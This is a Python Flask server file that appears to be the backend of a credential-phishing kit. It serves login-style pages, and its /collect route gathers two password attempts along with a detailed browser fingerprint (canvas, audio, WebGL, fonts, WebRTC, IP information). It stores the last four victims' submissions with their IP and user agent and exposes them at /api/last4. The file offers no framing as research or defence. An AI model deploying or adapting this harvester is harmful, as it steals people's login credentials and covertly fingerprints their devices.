# app.py
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os

app = Flask(__name__)

collected_entries = []
MAX_ENTRIES = 4

latest_fingerprint = None

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/1.html')
def serve_login():
    return send_from_directory('.', '1.html')

@app.route('/sec.html')
def serve_sec():
    return send_from_directory('.', 'sec.html')

@app.route('/rec.html')
def serve_rec():
    return send_from_directory('.', 'rec.html')

@app.route('/collect', methods=['POST'])
def collect():
    global latest_fingerprint

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr

    print(f"\n[COLLECT {ts}] from {ip}")

    if request.is_json:
        payload = request.get_json()
        print("JSON keys:", ', '.join(list(payload.keys())))
    else:
        payload = request.form.to_dict()
        print("Form keys:", ', '.join(list(payload.keys())))

    # Fingerprint detection (very broad)
    fp_indicators = [
        'canvas', 'audio', 'webgl', 'fonts', 'webrtc', 'ipInfo',
        'basic', 'connection', 'deviceMemory', 'collectedAt', 'hardware', 'memory'
    ]
    is_fp = any(k in payload for k in fp_indicators)

    if is_fp:
        print("→ FINGERPRINT DETECTED")
        latest_fingerprint = {
            "collectedAt": payload.get("collectedAt"),
            "basic": payload.get("basic") or payload.get("d"),
            "canvas": payload.get("canvas") or payload.get("c"),
            "audio": payload.get("audio") or payload.get("a"),
            "fonts": payload.get("fonts") or payload.get("f"),
            "webgl": payload.get("webgl") or payload.get("w"),
            "webrtc": payload.get("webrtc") or payload.get("r"),
            "ipInfo": payload.get("ipInfo") or payload.get("i"),
            "connection": payload.get("connection") or payload.get("n"),
            "hardware": payload.get("hw") or payload.get("hardwareConcurrency"),
            "memory": payload.get("mem") or payload.get("deviceMemory"),
            "error": payload.get("error")
        }
        print("  Stored FP keys:", ', '.join([k for k in latest_fingerprint if latest_fingerprint[k]]))
        return jsonify({"status": "fp_ok"}), 200

    # Combined login (attempt1 + attempt2)
    if 'attempt1' in payload and 'attempt2' in payload:
        print("→ COMBINED LOGIN DETECTED")
        entry = {
            "time": ts,
            "ip": ip,
            "user_agent": request.headers.get('User-Agent', '-'),
            "referer": request.headers.get('Referer', '-').split('/')[-1] or '-',
            "source": "combined_login",
            "method": "json",
            "attempt1": payload.get("attempt1"),
            "attempt2": payload.get("attempt2"),
            "combined_at": payload.get("combined_at")
        }

        if latest_fingerprint:
            print("→ MERGING FINGERPRINT")
            entry["fingerprint"] = latest_fingerprint
            latest_fingerprint = None
        else:
            print("→ NO FINGERPRINT TO MERGE")

        collected_entries.append(entry)
        while len(collected_entries) > MAX_ENTRIES:
            collected_entries.pop(0)

        print(f"→ Saved merged session. Total: {len(collected_entries)}")
        return jsonify({"status": "merged_ok", "count": len(collected_entries)}), 200

    # Fallback
    print("→ FALLBACK / UNKNOWN")
    entry = {
        "time": ts,
        "ip": ip,
        "user_agent": request.headers.get('User-Agent', '-'),
        "source": "unknown",
        **payload
    }
    collected_entries.append(entry)
    while len(collected_entries) > MAX_ENTRIES:
        collected_entries.pop(0)

    return jsonify({"status": "ok"}), 200

@app.route('/api/last4')
def last4():
    return jsonify({
        "count": len(collected_entries),
        "entries": list(reversed(collected_entries))
    })

@app.route('/<path:filename>')
def static_file(filename):
    return send_from_directory('.', filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)